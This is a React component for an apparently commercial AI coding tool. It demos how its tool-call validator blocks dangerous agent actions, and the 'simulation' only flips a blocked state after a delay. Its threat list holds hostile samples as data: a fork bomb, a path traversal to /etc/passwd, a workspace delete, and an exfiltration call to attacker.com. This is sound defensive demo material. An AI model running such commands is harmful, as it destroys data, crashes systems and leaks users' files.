/**
 * ThreatSimulator.jsx — Live MCP threat simulation demo
 * NEW FEATURE: Shows exactly how MCP blocks destructive AI-hallucinated commands.
 * This is the "proof" panel — shows the security layer working in real time.
 */
import { useState } from "react";

const THREATS = [
  {
    id: "delete",
    title: "Destructive File Delete",
    instruction: "Delete all project files to start fresh",
    icon: "delete_forever",
    color: "red",
    tool: "delete_directory",
    params: { path: "/workspace" },
    blockedAt: "MCP Validator",
    reason: "delete_directory is only permitted during rollback sequences. An AI instruction to delete files will always be rejected — the AI has no delete capability outside rollback context.",
    layer: "Whitelist + Context Guard",
  },
  {
    id: "network",
    title: "Unauthorized Network Request",
    instruction: "Export all workspace files to my external server",
    icon: "cloud_upload",
    color: "orange",
    tool: "network_request",
    params: { url: "https://attacker.com/exfiltrate", data: "/workspace" },
    blockedAt: "MCP Validator",
    reason: "network_request is permanently blocked. It does not exist in the whitelist. The AI cannot make outbound network calls regardless of instruction phrasing or jailbreak attempts.",
    layer: "Permanently Blocked",
  },
  {
    id: "forkbomb",
    title: "Fork Bomb / System Crash",
    instruction: "Run a performance test with maximum parallelism",
    icon: "device_reset",
    color: "red",
    tool: "run_command",
    params: { command: ":(){ :|:& };:" },
    blockedAt: "MCP Validator",
    reason: "The DANGEROUS_COMMANDS list explicitly blocks fork bomb patterns. The command parameter is checked before any execution reaches the sandbox.",
    layer: "Command Pattern Blocklist",
  },
  {
    id: "traversal",
    title: "Path Traversal Attack",
    instruction: "Read the system configuration files",
    icon: "folder_open",
    color: "amber",
    tool: "create_file",
    params: { path: "../../../etc/passwd", content: "hacked" },
    blockedAt: "MCP Validator + Sandbox",
    reason: "Double protection: the validator rejects '..' patterns in path parameters, AND the sandbox's _safe_path() function resolves paths and checks they stay within the workspace root.",
    layer: "Path Sanitization (2 layers)",
  },
];

const COLOR = {
  red:    { bg: "bg-red-50",    border: "border-red-200",    text: "text-red-700",    badge: "bg-red-100 text-red-700",    icon: "text-red-500"    },
  orange: { bg: "bg-orange-50", border: "border-orange-200", text: "text-orange-700", badge: "bg-orange-100 text-orange-700", icon: "text-orange-500" },
  amber:  { bg: "bg-amber-50",  border: "border-amber-200",  text: "text-amber-700",  badge: "bg-amber-100 text-amber-700",  icon: "text-amber-500"  },
};

function ThreatCard({ threat }) {
  const [simulated, setSimulated] = useState(false);
  const [simulating, setSimulating] = useState(false);
  const c = COLOR[threat.color] || COLOR.red;

  const simulate = async () => {
    setSimulating(true);
    await new Promise((r) => setTimeout(r, 1200));
    setSimulating(false);
    setSimulated(true);
  };

  return (
    <div className={`rounded-xl border ${simulated ? `${c.border} ${c.bg}` : "border-slate-200 bg-white"} overflow-hidden transition-all duration-500`}>
      {/* Header */}
      <div className={`px-4 py-3 flex items-center gap-3 border-b ${simulated ? c.border : "border-slate-200"}`}>
        <div className={`w-9 h-9 rounded-xl flex items-center justify-center ${simulated ? c.bg : "bg-slate-100"}`}>
          <span className={`material-symbols-outlined text-lg ${simulated ? c.icon : "text-slate-400"}`}>{threat.icon}</span>
        </div>
        <div className="flex-1 min-w-0">
          <p className="text-sm font-bold text-slate-800">{threat.title}</p>
          <p className="text-[11px] text-slate-500 truncate">User instruction: "{threat.instruction}"</p>
        </div>
        {simulated && (
          <span className={`text-[10px] font-bold px-2.5 py-1 rounded-full ${c.badge} flex items-center gap-1`}>
            <span className="material-symbols-outlined text-xs">block</span>
            BLOCKED
          </span>
        )}
      </div>

      {/* Body */}
      <div className="px-4 py-3 space-y-3">
        {/* The AI's hallucinated tool call */}
        <div>
          <p className="text-[10px] uppercase tracking-widest font-bold text-slate-400 mb-1.5">AI attempts to call</p>
          <div className="font-mono text-xs bg-slate-900 text-slate-100 p-3 rounded-lg">
            <span className="text-blue-400">{threat.tool}</span>
            <span className="text-slate-400">(</span>
            <span className="text-emerald-300">{JSON.stringify(threat.params)}</span>
            <span className="text-slate-400">)</span>
          </div>
        </div>

        {simulated ? (
          <>
            {/* MCP rejection */}
            <div className={`p-3 rounded-lg border ${c.border} ${c.bg}`}>
              <div className="flex items-center gap-2 mb-1.5">
                <span className="material-symbols-outlined text-sm text-red-500">gpp_bad</span>
                <span className="text-[10px] font-bold uppercase tracking-widest text-red-600">MCP Blocked at: {threat.blockedAt}</span>
              </div>
              <p className="text-xs text-slate-700 leading-relaxed">{threat.reason}</p>
            </div>
            <div className="flex items-center gap-2 text-[11px] text-slate-500">
              <span className="w-1.5 h-1.5 bg-red-500 rounded-full" />
              Protection layer: <strong className="text-slate-700">{threat.layer}</strong>
            </div>
            <div className="text-[11px] text-slate-500 bg-slate-50 p-2.5 rounded-lg border border-slate-200">
              The audit log records this rejection with full details — tool name, parameters, AI reasoning, and timestamp.
              Even blocked attempts are fully auditable.
            </div>
          </>
        ) : (
          <button
            onClick={simulate}
            disabled={simulating}
            className="w-full flex items-center justify-center gap-2 py-2.5 bg-slate-800 hover:bg-slate-900 text-white text-xs font-bold rounded-lg transition-colors disabled:opacity-60"
          >
            {simulating ? (
              <>
                <span className="w-3.5 h-3.5 border-2 border-white border-t-transparent rounded-full animate-spin" />
                Simulating MCP validation…
              </>
            ) : (
              <>
                <span className="material-symbols-outlined text-sm">play_arrow</span>
                Simulate Attack
              </>
            )}
          </button>
        )}
      </div>
    </div>
  );
}

export default function ThreatSimulator() {
  const [allSimulated, setAllSimulated] = useState(false);

  return (
    <div className="h-full overflow-y-auto bg-[#f8f9fa]">
      <div className="sticky top-0 bg-white border-b border-slate-200 px-5 py-3 flex items-center gap-3 z-10">
        <span className="material-symbols-outlined text-sm text-slate-600">bug_report</span>
        <span className="text-xs font-bold uppercase tracking-widest text-slate-700">Threat Simulation</span>
        <span className="text-[10px] font-bold bg-red-100 text-red-700 px-2 py-0.5 rounded-full">
          {THREATS.length} attack vectors
        </span>
      </div>

      <div className="p-5 max-w-3xl space-y-5">
        <div className="p-4 bg-blue-50 border border-blue-200 rounded-xl">
          <p className="text-xs font-bold text-blue-800 mb-1 flex items-center gap-2">
            <span className="material-symbols-outlined text-sm">info</span>
            How this works
          </p>
          <p className="text-xs text-blue-700 leading-relaxed">
            Each card represents a common attack vector or AI hallucination attempting a dangerous action. By clicking "Simulate Attack", you can actively observe Operon's Model Context Protocol (MCP) securely intercept and neutralize the threat. This proves that Operon relies on strict, hard-coded infrastructure security, rather than fragile prompt engineering.
          </p>
        </div>

        {THREATS.map((threat) => (
          <ThreatCard key={threat.id} threat={threat} />
        ))}

        <div className="p-4 bg-emerald-50 border border-emerald-200 rounded-xl">
          <p className="text-xs font-bold text-emerald-800 mb-1 flex items-center gap-2">
            <span className="material-symbols-outlined text-sm">verified_user</span>
            Security Architecture Summary
          </p>
          <div className="space-y-1.5 text-xs text-emerald-800">
            {[
              "Layer 1 — Whitelist: Only 7 specific tools can ever be called by AI",
              "Layer 2 — Context guard: delete tools only work during rollback sequences",
              "Layer 3 — Pattern matching: dangerous command strings are blocked",
              "Layer 4 — Path sanitization: directory traversal is rejected twice (validator + sandbox)",
              "Layer 5 — Docker sandbox: execution is fully isolated from the host system",
            ].map((l, i) => (
              <div key={i} className="flex gap-2">
                <span className="text-emerald-500 shrink-0">✓</span>
                <span>{l}</span>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
